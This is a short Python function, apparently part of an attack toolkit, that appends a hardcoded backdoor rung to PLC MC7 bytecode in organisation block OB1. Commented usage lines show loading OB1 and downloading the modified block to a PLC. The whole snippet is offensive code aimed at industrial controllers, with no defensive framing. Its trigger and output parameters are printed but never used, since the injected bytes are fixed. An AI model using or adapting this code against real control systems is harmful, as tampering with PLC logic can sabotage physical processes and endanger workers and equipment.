def inject_backdoor_rung(original_mc7, trigger_marker, target_output):
    """
    Inject malicious rung into MC7 bytecode
    """
    # Build backdoor rung in MC7 format
    # A M100.0; = Q0.0

    backdoor_mc7 = bytes([
        0x70, 0x83,  # A (AND)
        0x01, 0x90,  # M100.0 (marker bit 100.0)
        0x76, 0x82,  # = (assignment)
        0x00, 0x00   # Q0.0 (output 0.0)
    ])

    # Append to end of OB1
    modified_mc7 = original_mc7 + backdoor_mc7

    print("[+] Backdoor rung injected")
    print(f"    Trigger: M{trigger_marker}")
    print(f"    Target: Q{target_output}")

    return modified_mc7

# Usage:
# ob1_original = open('OB1.mc7', 'rb').read()
# ob1_backdoored = inject_backdoor_rung(ob1_original, 100, 0)
# 
# # Upload to PLC
# plc.download('OB', 1, ob1_backdoored)
